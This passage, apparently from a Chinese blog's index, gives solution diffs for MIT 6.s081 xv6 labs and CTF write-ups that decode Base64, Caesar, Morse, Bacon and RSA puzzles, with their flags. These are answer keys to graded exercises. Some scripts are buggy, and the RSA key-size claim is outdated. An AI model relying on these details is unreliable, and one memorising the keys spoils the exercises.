*pte |= PTE_COW;  // clear COW bit     pa = PTE2PA(*pte);     flags = PTE_FLAGS(*pte);-    if((mem = kalloc()) == 0)-      goto err;-    memmove(mem, (char*)pa, PGSIZE);-    if(mappages(new, i, PGSIZE, (uint64)mem, flags) != 0)&#123;-      kfree(mem);+    if(mappages(new, i, PGSIZE, pa, flags) != 0)&#123;       goto err;     &#125;+    incrfcount((void*)pa); // increment reference count to pa   &#125;   return 0; @@ -350,6 +348,9 @@ copyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len)    while(len &gt; 0)&#123;     va0 = PGROUNDDOWN(dstva);+    if (iscowpage(pagetable, va0)) &#123;+      cowfault(pagetable, va0);+    &#125;     pa0 = walkaddr(pagetable, va0);     if(pa0 == 0)       return -1;diff --git a/time.txt b/time.txtnew file mode 100644index 0000000..209e3ef--- /dev/null+++ b/time.txt@@ -0,0 +1 @@+20\n","categories":["操作系统"],"tags":["操作系统","经验","xv6"]},{"title":"MIT6.s081 2021 Lab Multithreading","url":"/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/","content":"Uthread: switching between threads思路xv6 已经实现了进程的切换机制，本实验要求参考进程的切换，实现一个用户态线程的切换。\n要实现线程切换，必然涉及上下文，即寄存器的保存和恢复，那么需要保存哪些寄存器？实际上，只需要保存被调用者保存寄存器（callee-saved registers），而实现调用者保存寄存器（caller-saved registers）的保存与恢复的代码由编译器自动生成。关于调用者保存与被调用者保存寄存器有哪些可以参照下述 RISC-V 的 calling convention：\n\n另外，根据 user/uthread_switch.S 的注释，thread_switch 最后通过 ret 指令将当前程序计数器的值切换为 ra 寄存器中存储的地址，实现进程的“切换”，因此 struct thread 中还需要保存每个线程对应程序的起始地址（即函数指针）。\n在了解需要保存哪些寄存器之后以及如何进行线程切换之后，还有一个细节需要考虑，即栈指针寄存器（sp）的初始化。线程栈的存储位置为 struct thread 中的 stack 数组，那么 sp 应该指向 stack 的位置，但由于栈的地址从大到小增长，因此 sp 应该初始化为 (uint64)t-&gt;stack + STACK_SIZE.\n代码diff --git a/user/uthread.c b/user/uthread.cindex 06349f5..74b7f20 100644--- a/user/uthread.c+++ b/user/uthread.c@@ -12,6 +12,20 @@   struct thread &#123;+  /* 0 */  uint64 ra;+  /* 8 */  uint64 sp;+  /* 16 */  uint64 s0;+  /* 24 */ uint64 s1;+  /* 32 */ uint64 s2;+  /* 40 */ uint64 s3;+  /* 48 */ uint64 s4;+  /* 56 */ uint64 s5;+  /* 64 */ uint64 s6;+  /* 72 */ uint64 s7;+  /* 80 */ uint64 s8;+  /* 88 */ uint64 s9;+  /* 96 */ uint64 s10;+  /* 104 */ uint64 s11;   char       stack[STACK_SIZE]; /* the thread&#x27;s stack */   int        state;             /* FREE, RUNNING, RUNNABLE */ &#125;;@@ -62,6 +76,7 @@ thread_schedule(void)      * Invoke thread_switch to switch from t to next_thread:      * thread_switch(??, ??);      */+\tthread_switch((uint64)t, (uint64)current_thread);   &#125; else     next_thread = 0; &#125;@@ -76,6 +91,8 @@ thread_create(void (*func)())   &#125;   t-&gt;state = RUNNABLE;   // YOUR CODE HERE+  t-&gt;ra = (uint64)func;+  t-&gt;sp = (uint64)t-&gt;stack + STACK_SIZE; &#125;  void diff --git a/user/uthread_switch.S b/user/uthread_switch.Sindex 5defb12..0eb0a2c 100644--- a/user/uthread_switch.S+++ b/user/uthread_switch.S@@ -7,5 +7,34 @@  \t.globl thread_switch thread_switch:\t/* YOUR CODE HERE */+\tsd ra, 0(a0)+\tsd sp, 8(a0)+\tsd s0, 16(a0)+\tsd s1, 24(a0)+\tsd s2, 32(a0)+\tsd s3, 40(a0)+\tsd s4, 48(a0)+\tsd s5, 56(a0)+\tsd s6, 64(a0)+\tsd s7, 72(a0)+\tsd s8, 80(a0)+\tsd s9, 88(a0)+\tsd s10, 96(a0)+\tsd s11, 104(a0)++\tld ra, 0(a1)+\tld sp, 8(a1)+\tld s0, 16(a1)+\tld s1, 24(a1)+\tld s2, 32(a1)+\tld s3, 40(a1)+\tld s4, 48(a1)+\tld s5, 56(a1)+\tld s6, 64(a1)+\tld s7, 72(a1)+\tld s8, 80(a1)+\tld s9, 88(a1)+\tld s10, 96(a1)+\tld s11, 104(a1) \tret    /* return to ra */\nUsing threads思路后两个实验与 xv6 无关，而是练习使用 POSIX 线程库在实际的 Linux 平台进行并发编程。\n本实验要求使用锁机制，实现一个支持并发的哈希表。首先需要确定的是：哪部分的操作会出现竞态（race condition）？根据观察不难得知 put() 操作可能存在下面这种情况：\n\n线程 1 和线程 2 本次 put() 映射到一个桶中（i 相同），都执行完 line 46 ~ 49 的循环之后，e 都为 0，随后先后执行 insert()，都创建一个新的 entry，并先后更新 table[i] 的值，导致先插入的键被覆盖。像这样，在一次插入操作未完成的情况下，另一次插入也开始进行且映射到一个桶中，就会导致丢键（keys missing）的情况发生。\n\n首先最简单无脑的办法就是给整个 put() 函数加一把大锁：\npthread_mutex_lock(&amp;lock);  // lockfor (e = table[i]; e != 0; e = e-&gt;next) &#123;    if (e-&gt;key == key)        break;&#125;if(e)&#123;    // update the existing key.    e-&gt;value = value;&#125; else &#123;    // the new is new.    insert(key, value, &amp;table[i], table[i]);&#125;pthread_mutex_unlock(&amp;lock);  // unlock\n\n可以看到，keys missing 的问题已经被解决，但是大锁带来的就是更低的性能，实际上根据上图可知，该实现在双核情况下的运行速度甚至慢于单核。\n实际上，对 table 数组的遍历并不会导致竞态，因此将加锁的操作延迟到遍历结束后：\nfor (e = table[i]; e != 0; e = e-&gt;next) &#123;    if (e-&gt;key == key)        break;&#125;pthread_mutex_lock(&amp;lock);  // lockif(e)&#123;    // update the existing key.    e-&gt;value = value;&#125; else &#123;    // the new is new.    insert(key, value, &amp;table[i], table[i]);&#125;pthread_mutex_unlock(&amp;lock);  // unlock\n\n做了上述修改后，仍然没有出现 key missing 的情况，同时效率提升了一倍以上。\n最后，更细化一些，只有当两个 put() 映射到同一个桶时才会发生竞态，因此可以为每个桶分别设置一把锁，以进一步提高并发性：\nfor (e = table[i]; e != 0; e = e-&gt;next) &#123;    if (e-&gt;key == key)        break;&#125;pthread_mutex_lock(&amp;locks[i]);  // lockif(e)&#123;    // update the existing key.    e-&gt;value = value;&#125; else &#123;    // the new is new.    insert(key, value, &amp;table[i], table[i]);&#125;pthread_mutex_unlock(&amp;locks[i]);  // unlock\n\n可见，效率又有进一步提升。\n代码diff --git a/notxv6/ph.c b/notxv6/ph.cindex 82afe76..321e269 100644--- a/notxv6/ph.c+++ b/notxv6/ph.c@@ -17,6 +17,7 @@ struct entry *table[NBUCKET]; int keys[NKEYS]; int nthread = 1; +pthread_mutex_t locks[NBUCKET];  double now()@@ -47,6 +48,7 @@ void put(int key, int value)     if (e-&gt;key == key)       break;   &#125;+  pthread_mutex_lock(&amp;locks[i]);   if(e)&#123;     // update the existing key.     e-&gt;value = value;@@ -54,7 +56,7 @@ void put(int key, int value)     // the new is new.     insert(key, value, &amp;table[i], table[i]);   &#125;-+  pthread_mutex_unlock(&amp;locks[i]); &#125;  static struct entry*@@ -118,6 +120,10 @@ main(int argc, char *argv[])     keys[i] = random();   &#125; ++  for (int i = 0; i &lt; NBUCKET; ++i) &#123;+    pthread_mutex_init(&amp;locks[i], NULL);+  &#125;   //   // first the puts   //\nBarrier思路最后一个实验主要是熟悉 POSIX 线程库中条件变量（conditional variable）的使用，实现的思路比较简单：前 nthread - 1 个线程在条件变量上休眠，最后一个线程将休眠的所有进程进行唤醒。有关条件变量的用法可以参考 OSTEP：OSTEP: Condition Variables.\n代码diff --git a/notxv6/barrier.c b/notxv6/barrier.cindex 12793e8..e4fd03e 100644--- a/notxv6/barrier.c+++ b/notxv6/barrier.c@@ -30,7 +30,18 @@ barrier()   // Block until all threads have called barrier() and   // then increment bstate.round.   //  ++  pthread_mutex_lock(&amp;bstate.barrier_mutex);+  ++bstate.nthread;+  if (bstate.nthread == nthread) &#123;+    pthread_cond_broadcast(&amp;bstate.barrier_cond);+\t++bstate.round;+\tbstate.nthread = 0;+  &#125;+  else &#123;+    pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex);+  &#125;+  pthread_mutex_unlock(&amp;bstate.barrier_mutex); &#125;\n","categories":["操作系统"],"tags":["操作系统","经验","xv6"]},{"title":"Crypto基础","url":"/2021/08/09/Crypto%E5%9F%BA%E7%A1%80/","content":"密码学是研究编制密码和破译密码的技术科学，本文将主要介绍密码学中常见的几种加密方式的原理以及实际的应用，并以攻防世界新手练习区例题为例进行分析。\n\nBase64\nBase64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。Base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。采用Base64编码具有不可读性，需要解码后才能阅读。\n\n加密原理Base64中的64表示64个可打印的字符（具体范围如下表所示），而要完全表示64个不同的字符至少需要6位二进制数(2^6=64)，我们知道一个字符类型数据在计算机中占用1Byte的存储空间，而1Byte为8bit，即一个字符实际在计算机中存储的是一个8位二进制数。\nBase64加密的实质是将每三个8bit字节转换为四个6bit字节（8*3=4*6），再在6bit字节的高位添0以补全为8位，最终转换为四个8bit字节，完成加密。例如：字符串s13，对应的ascii码为115 49 51，转换为二进制：01110011  00110001  00110011，将其分为4组：011100  110011  000100  110011，向高位补零：00011100  00110011  00000100  00110011，十进制为28 51 4 51，对照Base64编码表得到加密后的结果为：czEz，加密完成。\n\n我们发现这样貌似只能加密3的整数个字符，当末尾的字符无法凑成3的整数个的时候我们在用一个不在编码表中的字符加以代替，这个字符通常使用“=”，举个简单的例子：字符“A”，ascii码为65，转换成二进制数：01000001，由于此时末尾字符个数不为3的整数倍（1个），我们仍然将其分成四组，并且空位用“=”代替：010000  010===  ======  ======，对于不全为空的字节，在其末尾空位添零，全为空的字节在转换时用“=”代替：010000  010000  ======  ======，对应字符为：QQ==，加密完成。\n通过以上示例不难发现Base64加密的密文中，“=”最多只能出现两个且只会在末尾出现。\nBase32,Base16Base32,Base16与Base64类似，区别是他们分别得到5bit字节和4bit字节。Base32是将每5个8bit字节转换成8个5bit字节，编码字符范围为：大写字母A~Z和数字2~7，密文末尾最多可能出现7个“=”。Base16是将每个8bit字节转换成2个4bit字节，编码范围为：数字0~9和大写字母A~F，密文末尾不会出现“=”。\n例题分析题目链接base64\n分析与解答文本很明显是一串base64密文，直接解密即可，可以使用在线解密工具也可以直接用python的base64包解密，以下是python解密代码：\nimport base64cipher = &quot;Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9&quot;res = base64.b64decode(cipher)print(res.decode())\n运行，得到结果：cyberpeace{Welcome_to_new_World!}\n凯撒密码(Caesar Cipher)\n在密码学中，恺撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。\n\n加密原理在加密时，明文中的每个字母按照字母表的顺序向前或向后移动某一特定的位数并替换得到密文。例如明文为：FLAGISHERE，偏移量为3，那么密文就得到了：IODJLVKHUH，解密时则反向移动3位或正向移动26-3=23位。\n例题分析题目链接Caesar\n分析与解答根据字母的个数以及排列方式来看很明显对字母采用了凯撒加密，只需根据攻防世界常见的“cyberpeace”开头的flag格式得到正向偏移量为14，以此编写代码如下：\nwordList = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;,            &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;]t = open(&#x27;1.txt&#x27;, mode=&#x27;r&#x27;)  # 1.txt为题目附件string = t.read()n_str = &#x27;&#x27;n = 14for s in string:    if &#x27;a&#x27; &lt;= s &lt;= &#x27;z&#x27;:        index = wordList.index(s)        n_index = (index + n) % 26        n_str += wordList[n_index]    else:        n_str += sprint(n_str)t.close()\n运行，得到flag：cyberpeace{you_have_learned_caesar_encryption}\n摩尔斯电码(Morse Code)\n摩尔斯电码也被称作摩斯密码，是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。它发明于1837年，是一种早期的数字化通信形式。不同于现代化的数字通讯，摩尔斯电码只使用零和一两种状态的二进制代码，它的代码包括五种：短促的点信号“・”，保持一定时间的长信号“—”，表示点和划之间的停顿、每个词之间中等的停顿，以及句子之间长的停顿。\n\n加密原理摩尔斯电码的加密原理比较简单，就是长信号（一般为“—”）与短信号（一般为“·”）的组合来替换常见的字符，比如明文为：SOS，对应摩尔斯电码表加密后得到：··· — — — ···\n\n例题分析题目链接Morse\n分析与解答附件中仅由“0”和“1”构成，且每一部分以空格分开，则考虑采用了摩尔斯加密。将摩尔斯电码表中的对应关系定义为一个字典类型，遍历密文中的每一部分并得到明文字符，python代码如下：\nt = open(&#x27;2.txt&#x27;, mode=&#x27;r&#x27;)  # 2.txt为题目附件codes = t.read().split(&#x27; &#x27;)dic = &#123;&#x27;01&#x27;: &#x27;A&#x27;, &#x27;1000&#x27;: &#x27;B&#x27;, &#x27;1010&#x27;: &#x27;C&#x27;, &#x27;100&#x27;: &#x27;D&#x27;, &#x27;0&#x27;: &#x27;E&#x27;, &#x27;0010&#x27;: &#x27;F&#x27;, &#x27;110&#x27;: &#x27;G&#x27;,       &#x27;0000&#x27;: &#x27;H&#x27;, &#x27;00&#x27;: &#x27;I&#x27;, &#x27;0111&#x27;: &#x27;J&#x27;, &#x27;101&#x27;: &#x27;K&#x27;, &#x27;0100&#x27;: &#x27;L&#x27;, &#x27;11&#x27;: &#x27;M&#x27;, &#x27;10&#x27;: &#x27;N&#x27;, &#x27;111&#x27;: &#x27;O&#x27;, &#x27;0110&#x27;: &#x27;P&#x27;,       &#x27;1101&#x27;: &#x27;Q&#x27;, &#x27;010&#x27;: &#x27;R&#x27;, &#x27;000&#x27;: &#x27;S&#x27;, &#x27;1&#x27;: &#x27;T&#x27;, &#x27;001&#x27;: &#x27;U&#x27;, &#x27;0001&#x27;: &#x27;V&#x27;, &#x27;011&#x27;: &#x27;W&#x27;, &#x27;1001&#x27;: &#x27;X&#x27;, &#x27;1011&#x27;: &#x27;Y&#x27;,       &#x27;1100&#x27;: &#x27;Z&#x27;, &#x27;01111&#x27;: &#x27;1&#x27;, &#x27;00111&#x27;: &#x27;2&#x27;, &#x27;00011&#x27;: &#x27;3&#x27;, &#x27;00001&#x27;: &#x27;4&#x27;, &#x27;00000&#x27;: &#x27;5&#x27;, &#x27;10000&#x27;: &#x27;6&#x27;, &#x27;11000&#x27;: &#x27;7&#x27;,       &#x27;11100&#x27;: &#x27;8&#x27;, &#x27;11110&#x27;: &#x27;9&#x27;, &#x27;11111&#x27;: &#x27;0&#x27;, &#x27;001100&#x27;: &#x27;?&#x27;, &#x27;10010&#x27;: &#x27;/&#x27;, &#x27;101101&#x27;: &#x27;()&#x27;, &#x27;100001&#x27;: &#x27;-&#x27;,       &#x27;010101&#x27;: &#x27;.&#x27;&#125;flag = &#x27;&#x27;for c in codes:    if c in dic.keys():        flag += dic[c]    else:        flag += &#x27;*&#x27;print(flag.lower())t.close()\n运行，flag以小写字母输出并格式化：cyberpeace{morsecodeissointeresting}\n二进制幂数加密(Binary idempotent encryption)\n二进制幂数加密法，由于英文字母只有26个字母。只要2的0、1、2、3、4、5次幂就可以表示31个单元。通过用二进制幂数表示字母序号数来加密。\n\n加密原理在进行二进制数转十进制数的结果为二进制各位数的幂数之和，例如1010转换成十进制数时：2^1+2^3=10，并且N位二进制数能表示的最大十进制数为2^n-1，如四位二进制数最多可表示的十进制数为1111，即15。\n由于英文字母总数为26，因此我们只需5位二进制数即可表示所有的英文字母(2^5-1=31)，例如：\n明文：I LOVE CRYPTO\n字母序号：9/12 15 22 5/3 18 25 16 20 15（空格表示字母的间隔，斜杠表示单词的间隔）\n由于9=2^0+2^3，因此加密结果为：03，以此类推\n密文：  03/23 0123 124 02/01 14 034 4 24 0123\n栅栏密码(Rail-fence Cipher)传统栅栏密码加密原理首先确定一个key值，将明文字母按从上往下的顺序依次交替排列成key行，最后每行字母依次连接组成新字符串，得到密文。例如：\n明文：HAVE A GOOD DAY        key值：3\n将字母依次交替排列成3行： \n\n\n\n\nH\nE\nO\nD\n\n\n\n\nA\nA\nO\nA\n\n\nV\nG\nD\nY\n\n\n\n\n最后每行字母依次连接得到密文：HEODAAOAVGDY\n值得一提的是，栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）\nW型栅栏密码加密原理与传统栅栏密码类似，第一步先确定key值，在排列明文字母时不是垂直纵向排列，而是斜向45度角进行排列，且在排列key行后，变换方向后继续排列（右下变右上，右上变右下），组成多个“W”形，最后每行字母依次连接组成新字符串，得到密文。例如：\n明文：HAVE A GOOD DAY        key值：3\n将字母按“W”形排列成3行：  \n\n\n\n\nH\n.\n.\n.\nA\n.\n.\n.\nD\n.\n.\n.\n\n\n\n\n.\nA\n.\nE\n.\nG\n.\no\n.\nD\n.\nY\n\n\n.\n.\nV\n.\n.\n.\nO\n.\n.\n.\nA\n.\n\n\n\n\n最后每行依次连接得到密文：HADAEGODYVOA\n例题分析题目链接Railfence\n分析与解答密文看上去就是被打乱的flag值，基本上就是栅栏加密的结果，并且发现是W型栅栏加密。可以直接使用在线栅栏解密：\n在线栅栏解密\n培根密码(Bacon Cipher)加密原理培根加密时，明文中每个字母会转换成一组五个由a和b组成的字母，其转换关系表如下：\n\n\n\n\nA/a\naaaaa\nH/h\naabbb\nO/o\nabbba\nV/v\nbabab\n\n\n\n\nB/b\naaaab\nI/i\nabaaa\nP/p\nabbbb\nW/w\nbabba\n\n\nC/c\naaaba\nJ/j\nabaab\nQ/q\nbaaaa\nX/x\nbabbb\n\n\nD/d\naaabb\nK/k\nababa\nR/r\nbaaab\nY/y\nbbaaa\n\n\nE/e\naabaa\nL/l\nababb\nS/s\nbaaba\nZ/z\nbbaab\n\n\nF/f\naabab\nM/m\nabbaa\nT/t\nbaabb\n\n\n\n\nG/g\naabba\nN/n\nabbab\nU/u\nbabaa\n\n\n\n\n\n事实上，一般情况下，密文最终形式并不会由a和b组成，加密者通常会准备两种不同的字体，分别代表a和b，并且用一段由这两种字体所格式化的虚假信息作为密文，例如密文为：flagishere，根据字体的差异，将未加粗字体看作a，加粗字体看作b，得到：aaaab baabb，对照关系表得到明文为：bt.\n弗朗西斯·培根还另外准备了一种方法，将大小写分别看作a和b，这样可以适用在无法使用不同字体的场合，比如在处理纯文字的数据时。\n其实培根密码还有另外一种加密关系：\n\n\n\n\na\nAAAAA\ng\nAABBA\nn\nABBAA\nt\nBAABA\n\n\n\n\nb\nAAAAB\nh\nAABBB\no\nABBAB\nu-v\nBAABB\n\n\nc\nAAABA\ni-j\nABAAA\np\nABBBA\nw\nBABAA\n\n\nd\nAAABB\nk\nABAAB\nq\nABBBB\nx\nBABAB\n\n\ne\nAABAA\nl\nABABA\nr\nBAAAA\ny\nBABBA\n\n\nf\nAABAB\nm\nABABB\ns\nBAAAB\nz\nBABBB\n\n\n\n\n在解密培根密码时两种加密关系都要考虑。\n例题分析题目链接不仅仅是Morse\n分析与解答观察密文，很明显是莫尔斯电码的形式，摩尔斯解密之后，得到如下结果：\n\nmay be have another deconde  提示我们这并不是最终结果，后面还有另外一种加密方式，可以看到后面字母由a和b组成，考虑是培根加密，可以编写python程序解密：\nimport redef Bacon(in_string):    first_cipher = [&quot;aaaaa&quot;, &quot;aaaab&quot;, &quot;aaaba&quot;, &quot;aaabb&quot;, &quot;aabaa&quot;, &quot;aabab&quot;, &quot;aabba&quot;, &quot;aabbb&quot;, &quot;abaaa&quot;, &quot;abaab&quot;, &quot;ababa&quot;,                    &quot;ababb&quot;, &quot;abbaa&quot;, &quot;abbab&quot;, &quot;abbba&quot;, &quot;abbbb&quot;, &quot;baaaa&quot;, &quot;baaab&quot;, &quot;baaba&quot;, &quot;baabb&quot;, &quot;babaa&quot;, &quot;babab&quot;,                    &quot;babba&quot;, &quot;babbb&quot;, &quot;bbaaa&quot;, &quot;bbaab&quot;]    second_cipher = [&quot;aaaaa&quot;, &quot;aaaab&quot;, &quot;aaaba&quot;, &quot;aaabb&quot;, &quot;aabaa&quot;, &quot;aabab&quot;, &quot;aabba&quot;, &quot;aabbb&quot;, &quot;abaaa&quot;, &quot;abaaa&quot;, &quot;abaab&quot;,                     &quot;ababa&quot;, &quot;ababb&quot;, &quot;abbaa&quot;, &quot;abbab&quot;, &quot;abbba&quot;, &quot;abbbb&quot;, &quot;baaaa&quot;, &quot;baaab&quot;, &quot;baaba&quot;, &quot;baabb&quot;, &quot;baabb&quot;,                     &quot;babaa&quot;, &quot;babab&quot;, &quot;babba&quot;, &quot;babbb&quot;]    res1 = &quot;&quot;    res2 = &quot;&quot;    in_string = str.lower(in_string)    str_group = re.findall(&quot;.&#123;5&#125;&quot;, in_string)    for s_g in str_group:        n1 = first_cipher.index(s_g)        n2 = second_cipher.index(s_g)        res1 += chr(n1 + 65)        res2 += chr(n1 + 65)    print(&quot;first_cypher: &quot;, res1)    print(&quot;second_cypher: &quot;, res2)\n解密得到结果：ATTACKANDDEFENCEWORLDISINTERESTING\n格式化后得到flag值：cyberpeace{attackanddefenceworldisinteresting}\nRSA算法(RSA algorithm)\nRSA是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的\n\nRSA算法是引用最为广泛的一种公钥加密算法，所谓公钥加密(public key encryption)，也叫非对称加密。加密过程中，用于对数据加密的密钥称为公钥，对所有人公开，而对数据解密的密钥称为私钥，由接收者所保存，不对外公开。\n加密原理数学原理因为用以加密的公钥是对外公开的，那么我们应当保证解密的密钥无法被根据公钥反推出来，那要达到此目的必须使用到单向函数(One-way function)，即对于每一个输入，函数值都容易计算，但给出一个随机的函数值，要计算出原始的输入数据却很困难。常见的比如模运算：m^e mod n = c，已知m,e,n要求出密文c很简单，而已知e,n,c要求出明文m却很困难，RSA算法正是运用了这一特性。\n将加密方程变换：c^d mod n = m，其中d就是用以解密的密钥，它本身也不能被公开的n和e反推出来，根据数论：寻求两个大素数比较简单，而将它们的乘积质因数分解却极为困难。加密方程可以写成：m^e =  kn + c (k为正整数)，将c^d = (m^e - kn)^d带入解密方程中得到：(m^e - kn)^d mod n = m，由于(m^e - kn)^d多项式展开后的结果中只有m^ed项不包含n的乘积，因此方程化简为：m^ed mod n = m，可见，正确选取e和d使其满足此方程成为了算法的核心所在。\n根据欧拉定理：m，n为正整数，且gcd(m,n) = 1，则有m^φ(n) ≡ 1(mod n)，其中φ(n)称为对模n缩系的元素个数，即在小于等于n的正整数中与n互质的数的个数。对于一个大数n而言，要求出φ(n)的值是很困难的，但如果这个数本身就是质数，那么显然φ(n)=n-1。此外，φ(n)还有一个特性：对于互质的两个正整数p,q而言，φ(pq) = φ(p)φ(q)，那么我们在选取n的值时可以先选取互质的两个数p和q，根据以上定理，n = pq，φ(n) = φ(pq) = (p-1)(q-1)。\n根据以上原理，我们将欧拉定理方程进行变换，等式两端同时取k次幂并乘上m，最后变换成模运算的形式得到：m^{kφ(n)+1} mod n = m，与我们之前得到的 m^ed mod n = m 相比照，联立两式：ed = kφ(n) + 1，写成模运算形式：ed mod φ(n) = 1，因此我们可以通过选取加密密钥e来得到解密密钥d，值得注意的是这里e值的选取必须保证gcd(e,φ(n)) = 1，否则d值将不存在，具体数学证明略。\n最终将e和n的值公布，作为加密公钥，将d的值保留作为解密私钥。由于他人未知p和q的值，且n是一个大数的情况下对n进行质因数分解十分困难，也就无法得到φ(n)的值，就无法根据e求得d。\nRSA允许你选择公钥大小。512位密钥被视为不安全；768位密钥不用担心受到除了国家安全管理（NSA）外其他事物的危害；1024位几乎是安全的。\n加密原理参考链接：探秘公钥加密算法RSA\n算法流程（1）选取两个大素数p和q，得到乘积n = pq，则φ(n) = (p-1)(q-1)。\n（2）选取一个大整数e，满足gcd(e,φ(n)) = 1。\n（3）根据方程 ed mod φ(n) = 1 确定d的值。\n（4）公开n和e，作为公钥，私密保存d，作为私钥。\n（5）加密方程为：c = m^e mod n.    解密方程为：m = c^d mod n\n例题分析题目链接easy_RSA\n分析与解答题目直接给出了p，q，e的值，要求求解d，得到φ(n)后根据 ed mod φ(n) = 1求解即可，这里我直接将模运算写成了 ed = kφ(n) + 1，并遍历k的值，若e能被 kφ(n) + 1 整除则得到解密密钥d。\np = 473398607161q = 4511491e = 17fai_N = (p - 1) * (q - 1)k = 0while True:    if (k * fai_N + 1) % e == 0:        d = (k * fai_N + 1) // e        break    k += 1print(&quot;d值为：&quot;, d)\n运行得到结果：125631357777427553，flag即为：cyberpeace{125631357777427553}。\n","categories":["信息安全"],"tags":["CTF","Crypto","信息安全","攻防世界"]},{"title":"MIT6.s081 2021 Lab File system","url":"/2024/08/16/MIT6.s081-2021-Lab%20File%20system/","content":"Large files思路xv6 文件系统的 inode 中地址域 addrs[] 由 12 个直接地址和 1 个一级间接地址组成，本实验要求将地址域更改为 11 个直接地址、1 个一级间接地址和 1 个二级间接地址组成，以支持更大文件的存储。\n代码的实现有了直接地址和一级间接地址做参考，就很简单了，直接查看代码部分即可。\n代码diff --git a/kernel/file.h b/kernel/file.hindex b076d1d..5c4eb3a 100644--- a/kernel/file.h+++ b/kernel/file.h@@ -26,7 +26,7 @@ struct inode &#123;   short minor;   short nlink;   uint size;-  uint addrs[NDIRECT+1];+  uint addrs[NDIRECT+2]; &#125;;  // map major device number to device functions.diff --git a/kernel/fs.c b/kernel/fs.cindex 40c9bd4..4c00ab5 100644--- a/kernel/fs.c+++ b/kernel/fs.c@@ -400,6 +400,33 @@ bmap(struct inode *ip, uint bn)     brelse(bp);     return addr;   &#125;+  bn -= NINDIRECT;++  if (bn &lt; NINDIRECT2) &#123;+    if ((addr = ip-&gt;addrs[NDIRECT + 1]) == 0) &#123;+      ip-&gt;addrs[NDIRECT + 1] = addr = balloc(ip-&gt;dev);+    &#125;++    uint i = bn / NINDIRECT, j = bn % NINDIRECT;+    +    bp = bread(ip-&gt;dev, addr);+    a = (uint *)bp-&gt;data;+    if ((addr = a[i]) == 0) &#123;+      a[i] = addr = balloc(ip-&gt;dev);+      log_write(bp);+    &#125;+    brelse(bp);++    bp = bread(ip-&gt;dev, addr);+    a = (uint *)bp-&gt;data;+    if ((addr = a[j]) == 0) &#123;+      a[j] = addr = balloc(ip-&gt;dev);+      log_write(bp);+    &#125;+    brelse(bp);++    return addr;+  &#125;    panic(&quot;bmap: out of range&quot;); &#125;@@ -432,6 +459,29 @@ itrunc(struct inode *ip)     ip-&gt;addrs[NDIRECT] = 0;   &#125; +  struct buf *bp2;+  uint *a2;+  if (ip-&gt;addrs[NDIRECT + 1]) &#123;+    bp = bread(ip-&gt;dev, ip-&gt;addrs[NDIRECT + 1]);+    a = (uint *)bp-&gt;data;+    for (i = 0; i &lt; NINDIRECT; ++i) &#123;+      if (a[i]) &#123;+        bp2 = bread(ip-&gt;dev, a[i]);+        a2 = (uint *)bp2-&gt;data;+        for (j = 0; j &lt; NINDIRECT; ++j) &#123;+          if (a2[j]) &#123;+            bfree(ip-&gt;dev, a2[j]);+          &#125;+        &#125;+        brelse(bp2);+        bfree(ip-&gt;dev, a[i]);+      &#125;+    &#125;+    brelse(bp);+    bfree(ip-&gt;dev, ip-&gt;addrs[NDIRECT + 1]);+    ip-&gt;addrs[NDIRECT + 1] = 0;+  &#125;+   ip-&gt;size = 0;   iupdate(ip); &#125;diff --git a/kernel/fs.h b/kernel/fs.hindex 139dcc9..cd5de8a 100644--- a/kernel/fs.h+++ b/kernel/fs.h@@ -24,9 +24,10 @@ struct superblock &#123;  #define FSMAGIC 0x10203040 -#define NDIRECT 12+#define NDIRECT 11 #define NINDIRECT (BSIZE / sizeof(uint))-#define MAXFILE (NDIRECT + NINDIRECT)+#define NINDIRECT2 (NINDIRECT * NINDIRECT)+#define MAXFILE (NDIRECT + NINDIRECT + NINDIRECT2)  // On-disk inode structure struct dinode &#123;@@ -35,7 +36,7 @@ struct dinode &#123;   short minor;          // Minor device number (T_DEVICE only)   short nlink;          // Number of links to inode in file system   uint size;            // Size of file (bytes)-  uint addrs[NDIRECT+1];   // Data block addresses+  uint addrs[NDIRECT+2];   // Data block addresses &#125;;  // Inodes per block.\nSymbolic links思路本实验要求为 xv6 实现符号链接（软链接）机制，符号链接本质上也是一个文件，只不过它的数据内容为该链接指向的文件路径，这其实与 Windows 系统的快捷方式十分类似。实现方案如下：\n首先依照 Lab System call 中的方法，添加系统调用 symlink：添加 symlink() 声明，添加系统调用号，添加系统调用 entry，添加 sys_symlink() 声明。\n在理解了符号链接的本质后，就可以着手实现 sys_symlink 了。首先明确一下 symlink 的作用，它包含两个参数：target 和 path，作用是创建一个目录为 path 的符号链接，该符号链接指向目录为 target 的文件。实现思路应该比较清晰：使用 create() 创建一个文件类型为符号链接（需要自行定义）的文件，再使用 writei() 将字符串 path 写入该文件中。\nuint64 sys_symlink(void) &#123;    int n1, n2;    char target[MAXPATH], path[MAXPATH];    struct inode *ip;    // get arguments of symlink    if ((n1 = argstr(0, target, 